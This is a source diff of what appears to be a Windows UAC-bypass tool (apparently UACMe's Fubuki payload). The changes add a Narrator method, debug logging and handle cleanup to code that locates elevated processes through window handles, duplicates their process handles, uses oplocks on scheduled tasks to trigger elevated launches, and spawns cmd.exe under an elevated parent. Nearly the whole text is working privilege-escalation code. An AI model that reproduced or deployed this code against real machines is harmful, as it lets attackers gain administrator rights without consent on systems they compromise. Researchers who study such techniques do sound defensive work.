@@ -1259,6 +1259,8 @@ BOOL ucmLaunchPayload3(
 
     if (ucmCheckUIAccessPermissions()) {
 
+        ucmLogDbgMsg(L"[Fubuki] ucmCheckUIAccessPermissions passed\r\n");
+
         //
         // Determine what we want to execute, custom parameter or default cmd.exe
         //
@@ -1294,7 +1296,7 @@ BOOL ucmLaunchPayload3(
             RtlSecureZeroMemory(sysdir, sizeof(sysdir));
             ucmxQuerySystemDirectory(sysdir, FALSE);
 
-            _strcpy(cmdbuf, sysdir);           
+            _strcpy(cmdbuf, sysdir);
             _strcat(cmdbuf, CMD_EXE);
 
             lpCommandLine = cmdbuf;
@@ -1308,6 +1310,8 @@ BOOL ucmLaunchPayload3(
         hProcess = ucmFindFirstElevatedProcessHandle();
         if (!hProcess) {
 
+            ucmLogDbgMsg(L"[Fubuki] ucmFindFirstElevatedProcessHandle is NULL\r\n");
+
             RtlSecureZeroMemory(szOplockPath, sizeof(szOplockPath));
 
             switch (ucmMethod) {
@@ -1316,6 +1320,7 @@ BOOL ucmLaunchPayload3(
                 _strcat(szOplockPath, pszOpLockFile);
                 break;
             case UacMethodTabTip:
+            case UacMethodNarrator:
                 _strcpy(szOplockPath, pszOpLockFile);
                 break;
             default:
@@ -1325,7 +1330,7 @@ BOOL ucmLaunchPayload3(
             if (ucmStartLockedElevatedProcess(
                 szOplockPath,
                 pszTask,
-                &ofc)) 
+                &ofc))
             {
                 for (i = 0; i < 5000; i += 50) {
                     hProcess = ucmFindFirstElevatedProcessHandle();
@@ -1341,12 +1346,12 @@ BOOL ucmLaunchPayload3(
         }
 
         if (hProcess) {
+            ucmLogDbgMsg(L"[Fubuki] Calling ucmCreateProcessWithParent\r\n");
             RtlSecureZeroMemory(&pi, sizeof(pi));
             bResult = ucmCreateProcessWithParent(lpCommandLine, hProcess, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
             if (bResult) {
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
-
             }
             CloseHandle(hProcess);
         }
@@ -2091,7 +2096,7 @@ BOOL ucmSetEnvironmentVariable(
 *
 * Purpose:
 *
-* Thread procedure to wait for oplock notification.
+* Thread procedure waiting for oplock notification.
 *
 */
 DWORD WINAPI ucmxWaitForOpLockThread(
@@ -2154,6 +2159,14 @@ BOOL ucmWaitForOpLock(
     return bResult;
 }
 
+/*
+* ucmReleaseOpLock
+*
+* Purpose:
+*
+* Release oplock file context resources.
+*
+*/
 BOOL ucmReleaseOpLock(
     _In_ POPLOCK_FILE_CONTEXT ofc
 )
@@ -2172,6 +2185,14 @@ BOOL ucmReleaseOpLock(
     return TRUE;
 }
 
+/*
+* ucmOpLockFile
+*
+* Purpose:
+*
+* Request oplock on specified file.
+*
+*/
 BOOL ucmOpLockFile(
     _In_ LPCWSTR FileName,
     _In_ ACCESS_MASK DesiredAccess,
@@ -2219,6 +2240,8 @@ BOOL ucmOpLockFile(
 
     ofc->FileHandle = CreateFile(FileName, DesiredAccess, ShareMode, NULL, OPEN_EXISTING, flags, NULL);
     if (ofc->FileHandle == INVALID_HANDLE_VALUE) {
+        CloseHandle(ofc->Overlapped.hEvent);
+        ofc->Overlapped.hEvent = NULL;
         return FALSE;
     }
 
@@ -2231,6 +2254,10 @@ BOOL ucmOpLockFile(
     }
 
     if (GetLastError() != ERROR_IO_PENDING) {
+        CloseHandle(ofc->FileHandle);
+        CloseHandle(ofc->Overlapped.hEvent);
+        ofc->Overlapped.hEvent = NULL;
+        ofc->FileHandle = NULL;
         return FALSE;
     }
 
@@ -2246,7 +2273,7 @@ BOOL ucmOpLockFile(
 *
 * Purpose:
 *
-* EnumWindows callback to hide windows belonging to current process.
+* EnumWindows callback to hide current process windows.
 *
 */
 BOOL ucmxHideMainWindowCallback(
@@ -2280,7 +2307,7 @@ BOOL ucmxHideMainWindowCallback(
 *
 * Purpose:
 *
-* Hide current process windows.
+* Hide current process main windows.
 *
 */
 VOID ucmHideMainWindow(
@@ -2302,35 +2329,49 @@ BOOL ucmCheckUIAccessPermissions(
     VOID)
 {
     BOOL bResult = FALSE;
+    ULONG retLen, uiAccess;
+    NTSTATUS status;
     HANDLE hToken = NULL;
     BYTE tmlbuf[sizeof(TOKEN_MANDATORY_LABEL) + sizeof(SID)];
-    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)&tmlbuf[0];
-    DWORD UIAccessFlag = 0;
-    DWORD* pdwIntegrityLevel = NULL;
-    DWORD retLen = 0;
+    PTOKEN_MANDATORY_LABEL tml = (PTOKEN_MANDATORY_LABEL)tmlbuf;
+    DWORD* pdwIntegrityLevel;
 
     do {
 
-        if (!NT_SUCCESS(NtOpenProcessToken(
+        status = NtOpenProcessToken(
             NtCurrentProcess(),
             MAXIMUM_ALLOWED,
-            &hToken)))
-        {
-            break;
-        }
+            &hToken);
 
-        retLen = sizeof(UIAccessFlag);
-        if (!GetTokenInformation(hToken, TokenUIAccess, &UIAccessFlag, sizeof(UIAccessFlag), &retLen))
+        if (!NT_SUCCESS(status))
             break;
 
-        if (UIAccessFlag == 0)
+        status = NtQueryInformationToken(
+            hToken,
+            TokenUIAccess,
+            &uiAccess,
+            sizeof(uiAccess),
+            &retLen);
+
+        if (!NT_SUCCESS(status))
             break;
 
-        retLen = sizeof(tmlbuf);
-        if (!GetTokenInformation(hToken, TokenIntegrityLevel, tml, retLen, &retLen))
+        if (uiAccess == 0)
             break;
 
-        pdwIntegrityLevel = GetSidSubAuthority(tml->Label.Sid, 0);
+        RtlSecureZeroMemory(tmlbuf, sizeof(tmlbuf));
+
+        status = NtQueryInformationToken(
+            hToken,
+            TokenIntegrityLevel,
+            tml,
+            sizeof(tmlbuf),
+            &retLen);
+
+        if (!NT_SUCCESS(status))
+            break;
+
+        pdwIntegrityLevel = RtlSubAuthoritySid(tml->Label.Sid, 0);
         if (*pdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
             break;
 
@@ -2338,7 +2379,9 @@ BOOL ucmCheckUIAccessPermissions(
 
     } while (FALSE);
 
-    if (hToken) NtClose(hToken);
+    if (hToken)
+        NtClose(hToken);
+
     return bResult;
 }
 
@@ -2349,7 +2392,7 @@ typedef HANDLE(WINAPI* pfnGetProcessHandleFromHwnd)(HWND hwnd);
 *
 * Purpose:
 *
-* Wrapper for oleacc!GetProcessHandleFromHwnd.
+* Wrapper for oleacc!GetProcessHandleFromHwnd->user32!GetWindowProcessHandle->win32u!NtUserGetWindowProcessHandle
 *
 */
 HANDLE ucmCallGetProcessHandleFromHwnd(
@@ -2380,11 +2423,11 @@ HANDLE ucmCallGetProcessHandleFromHwnd(
 *
 */
 BOOL ucmCreateProcessWithParent(
-    _In_ LPWSTR lpCommandLine,
+    _Inout_opt_ LPWSTR lpCommandLine,
     _In_ HANDLE hParent,
     _In_ DWORD dwFlags,
     _In_ WORD wShow,
-    _In_ PROCESS_INFORMATION* pi
+    _In_ PROCESS_INFORMATION * pi
 )
 {
     SIZE_T ptsize = 0;
@@ -2435,8 +2478,17 @@ HANDLE ucmGetHwndFullProcessHandle(
 
     hProcess = ucmCallGetProcessHandleFromHwnd(hwnd);
     if (hProcess) {
-        DuplicateHandle(hProcess, (HANDLE)-1, (HANDLE)-1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS);
-        CloseHandle(hProcess);
+        if (!NT_SUCCESS(NtDuplicateObject(hProcess,
+            NtCurrentProcess(),
+            NtCurrentProcess(),
+            &hDuplicate,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS)))
+        {
+            hDuplicate = NULL;
+        }
+        NtClose(hProcess);
     }
 
     return hDuplicate;
@@ -2451,7 +2503,7 @@ HANDLE ucmGetHwndFullProcessHandle(
 *
 */
 BOOL ucmxEnumElevatedWindows(
-    _In_ HWND hwnd, 
+    _In_ HWND hwnd,
     _In_ LPARAM lParam)
 {
     DWORD dwPid = 0;
@@ -2494,6 +2546,7 @@ BOOL ucmxEnumElevatedWindows(
     CloseHandle(hToken);
 
     if (tkElvType != TokenElevationTypeFull) {
+        // Continue to next window.
         return TRUE;
     }
 
@@ -2509,22 +2562,13 @@ BOOL ucmxEnumElevatedWindows(
 }
 
 /*
-* ucmFindFirstElevatedWindow
+* ucmFindFirstElevatedProcessHandle
 *
 * Purpose:
 *
-* Find first elevated window.
+* Find first elevated process window and return process handle.
 *
 */
-HWND ucmFindFirstElevatedWindow(
-    VOID
-)
-{
-    HWND hwnd = NULL;
-    EnumWindows((WNDENUMPROC)ucmxEnumElevatedWindows, (LPARAM)&hwnd);
-    return hwnd;
-}
-
 HANDLE ucmFindFirstElevatedProcessHandle(
     VOID
 )
@@ -2532,27 +2576,29 @@ HANDLE ucmFindFirstElevatedProcessHandle(
     HWND hwnd = NULL;
     HANDLE hProcess = NULL;
 
+    //
+    // First try message-only windows.
+    //
     do {
-
         hwnd = FindWindowEx(HWND_MESSAGE, hwnd, NULL, NULL);
         if (hwnd) {
             if (!ucmxEnumElevatedWindows(hwnd, (LPARAM)&hProcess)) {
                 break;
             }
         }
-
     } while (hwnd);
 
+    //
+    // Repeat the search over top-level desktop windows.
+    //
     if (!hwnd) {
         do {
-
             hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
             if (hwnd) {
                 if (!ucmxEnumElevatedWindows(hwnd, (LPARAM)&hProcess)) {
                     break;
                 }
             }
-
         } while (hwnd);
     }
 
@@ -2564,7 +2610,7 @@ HANDLE ucmFindFirstElevatedProcessHandle(
 *
 * Purpose:
 *
-* Run a scheduled task.
+* Execute scheduled task.
 *
 */
 BOOL ucmRunScheduledTask(
@@ -2628,7 +2674,7 @@ BOOL ucmRunScheduledTask(
 *
 * Purpose:
 *
-* Create oplock on file and run scheduled task.
+* Create oplock and start elevated scheduled task.
 *
 */
 BOOL ucmStartLockedElevatedProcess(
